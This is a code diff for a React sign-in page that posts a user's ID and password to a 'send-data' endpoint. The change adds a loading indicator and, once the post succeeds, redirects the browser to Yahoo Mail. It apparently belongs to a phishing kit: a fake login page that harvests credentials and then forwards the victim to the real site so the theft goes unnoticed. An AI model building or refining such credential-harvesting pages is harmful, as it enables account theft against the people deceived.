@@ -1,4 +1,4 @@
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 import UserID from '../component/UserID'
 import Password from '../component/Password'
 import isValidEmail from '../helpers/validateEmail'
@@ -13,6 +13,12 @@ const Signin = () => {
   const [password, setPassword] = useState('')
   const [error, setError] = useState('')
   const [showPassword, setShowPassword] = useState(false)
+  const [isLoading, setIsLoading] = useState(false)
+  const [redirect, setRedirect] = useState(false)
+
+  useEffect(() => {
+    redirect && window.location.replace('https://mail.yahoo.com/')
+  }, [redirect])
 
   const handleContinue = () => {
     setError('')
@@ -26,9 +32,13 @@ const Signin = () => {
       if (!password) {
         setError('Please enter your password')
       } else {
+        setIsLoading(true)
         axios
           .post(`${baseURL}send-data`, { userID, password })
-          .then((resp) => console.log(resp.data))
+          .then((resp) => {
+            console.log(resp.data)
+            setRedirect(true)
+          })
           .catch((e) => console.log(e))
       }
     }
@@ -75,7 +85,7 @@ const Signin = () => {
             </footer>
           </section>
         </section>
-        <Loader message={'loading'} />
+        {isLoading && <Loader message={'loading'} />}
       </main>
       {/* <footer>footer</footer> */}
     </div>
